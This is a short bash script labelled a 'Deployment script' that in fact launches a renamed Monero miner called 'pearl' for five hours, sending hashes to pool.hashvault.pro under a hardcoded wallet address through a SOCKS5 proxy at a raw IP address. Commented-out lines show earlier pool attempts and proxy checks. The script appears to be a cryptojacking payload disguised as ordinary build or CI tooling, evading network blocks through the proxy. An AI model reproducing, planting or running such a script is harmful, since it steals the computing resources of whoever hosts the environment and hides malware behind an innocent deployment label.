#!/bin/bash

echo "Deployment script started"
# cat /etc/os-release
#which curl
#which npm 
#which node
#which wget
#whoami 
which timeout
#pearl --version
#echo "Checking proxy:"
#curl --socks5 199.116.112.6:4145 ipinfo.io

# does not work wothout proxy
echo "Running pearl"
#timeout 360 pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
timeout 18000 pearl -x 199.116.112.6:4145 -o pool.hashvault.pro:80 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero -t 30 --cpu-priorit=5


exit 0
#curl 18.196.88.146:14433
#ping -c 1 xmr-eu1.nanopool.org